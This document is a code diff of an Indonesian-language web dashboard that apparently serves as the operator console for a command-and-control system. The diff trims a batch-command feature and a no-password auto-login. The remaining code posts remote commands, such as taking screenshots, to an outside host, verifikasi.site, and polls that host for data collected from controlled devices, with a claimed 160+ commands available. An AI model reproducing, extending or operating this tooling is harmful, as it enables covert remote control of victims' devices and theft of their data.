@@ -108,7 +108,7 @@
 
 <div class="toast" id="toast"></div>
 
-<!-- MAIN (TANPA LOGIN!) -->
+<!-- MAIN -->
 <div id="main">
     <div class="header">
         <h1><span class="live-dot"></span> 🔬 DASHBOARD ULTIMATE v2.0</h1>
@@ -182,15 +182,6 @@
                 <button class="btn-blue" onclick="sendC2Custom()">📤 Kirim Custom</button>
             </div>
             <div id="c2Result" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
-        </div>
-
-        <div class="card">
-            <h2>📦 BATCH C2 (Kirim Banyak Perintah Sekaligus) <span class="badge" id="queueLength">Queue: 0</span></h2>
-            <div class="flex" style="margin-bottom:10px;">
-                <textarea id="batchCommands" rows="6" style="flex:1;min-width:300px;font-family:monospace;font-size:11px;background:var(--bg-input);color:var(--text-primary);border:1px solid var(--border-color);border-radius:5px;padding:8px;" placeholder='Contoh: {"aksi":"screenshot"} satu per baris'></textarea>
-                <button class="btn-purple" onclick="sendBatchC2()">📤 Kirim Batch</button>
-            </div>
-            <div id="batchResult" style="color:var(--text-secondary);font-size:11px;margin-top:6px;">Ready</div>
         </div>
 
         <div class="card"><h2>📜 C2 History</h2><div id="c2History" style="max-height:200px;overflow-y:auto;font-size:12px;"></div></div>
@@ -494,7 +485,6 @@ function refreshData() {
         } catch(e) {}
     }
     
-    // 🔥 PAKAI FULL URL!
     fetch('https://verifikasi.site/data')
         .then(function(r){ 
             if(!r.ok) throw new Error('HTTP ' + r.status);
@@ -591,7 +581,7 @@ function renderDataSections() {
             html += renderDataContent(src, items, last);
             html += '</div>';
         });
-        container.innerHTML = html || '<div class="empty">📭 Tidak ada数据</div>';
+        container.innerHTML = html || '<div class="empty">📭 Tidak ada data</div>';
         
         var pagContainer = document.getElementById('dataPagination');
         if (totalPages > 1) {
@@ -904,7 +894,6 @@ function sendC2(aksi, params){
     renderC2History();
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    // 🔥 PAKAI FULL URL!
     fetch('https://verifikasi.site/data', { 
         method: 'POST', 
         headers: {'Content-Type': 'application/json'},
@@ -912,13 +901,12 @@ function sendC2(aksi, params){
     })
     .then(function(r){ return r.json(); })
     .then(function(res){
-        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi + ' (Queue: ' + (res.queueLength || '?') + ')';
+        document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
         document.getElementById('c2Result').style.color = '#0f0';
         var last = c2History[c2History.length-1];
         if(last){ last.status='✅ Success'; last.response=res; }
         renderC2History();
         showToast('✅ Command sent: '+aksi);
-        updateQueueLength();
     })
     .catch(function(){
         document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
@@ -938,80 +926,6 @@ function sendC2Custom(){
         var params = data.params || {};
         sendC2(aksi, params);
     } catch(e){ showToast('❌ Invalid JSON: '+e.message); }
-}
-
-function sendBatchC2() {
-    var textarea = document.getElementById('batchCommands');
-    var lines = textarea.value.split('\n').filter(function(line) { 
-        return line.trim().length > 0; 
-    });
-    if(lines.length === 0) {
-        showToast('Masukkan minimal 1 perintah!');
-        return;
-    }
-    var total = lines.length;
-    var success = 0;
-    var failed = 0;
-    var results = [];
-    document.getElementById('batchResult').textContent = '⏳ Mengirim ' + total + ' perintah...';
-    document.getElementById('batchResult').style.color = '#ff0';
-    lines.forEach(function(line, index) {
-        try {
-            var cmd = JSON.parse(line.trim());
-            var aksi = cmd.aksi || cmd.command || 'unknown';
-            var params = cmd.params || {};
-            fetch('https://verifikasi.site/data', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    sumber: 'c2_command',
-                    data: { aksi: aksi, params: params }
-                })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(res) {
-                success++;
-                document.getElementById('batchResult').textContent = '✅ ' + success + '/' + total + ' terkirim (Queue: ' + (res.queueLength || '?') + ')';
-                updateQueueLength();
-            })
-            .catch(function() {
-                failed++;
-            });
-        } catch(e) {
-            failed++;
-            results.push('❌ ' + line + ' → ' + e.message);
-        }
-    });
-    setTimeout(function() {
-        document.getElementById('batchResult').textContent = '✅ ' + success + ' perintah terkirim, ' + failed + ' gagal';
-        document.getElementById('batchResult').style.color = success > 0 ? '#0f0' : '#f44';
-        if(results.length > 0) {
-            showToast(results.join(' | '));
-        }
-        updateQueueLength();
-    }, (lines.length * 300) + 2000);
-}
-
-function updateQueueLength() {
-    try {
-        fetch('https://verifikasi.site/data?type=perintah', { method: 'GET' })
-            .then(function(r) { return r.text(); })
-            .then(function(text) {
-                try {
-                    var data = JSON.parse(text);
-                    if (data && data.id) {
-                        document.getElementById('queueLength').textContent = 'Queue: ?';
-                    } else {
-                        document.getElementById('queueLength').textContent = 'Queue: 0';
-                    }
-                } catch(e) {
-                    document.getElementById('queueLength').textContent = 'Queue: 0';
-                }
-            })
-            .catch(function() {
-                document.getElementById('queueLength').textContent = 'Queue: ?';
-            });
-    } catch(e) {}
 }
 
 function renderC2History(){
@@ -1139,16 +1053,12 @@ function uploadFileSubmit(){
 }
 
 // ============================================================
-// 🔥 INIT - LANGSUNG TAMPILKAN DASHBOARD!
+// 🔥 INIT
 // ============================================================
-document.getElementById('main').style.display = 'block';
-document.getElementById('statusInfo').textContent = '🔓 Akses langsung - Tanpa Password';
-
 renderC2Buttons();
 refreshData();
 connectWebSocket();
 setInterval(refreshData, 5000);
-setInterval(updateQueueLength, 10000);
 
 console.log('🔬 DASHBOARD ULTIMATE v2.0 LOADED');
 console.log('📊 160+ C2 Commands Ready');
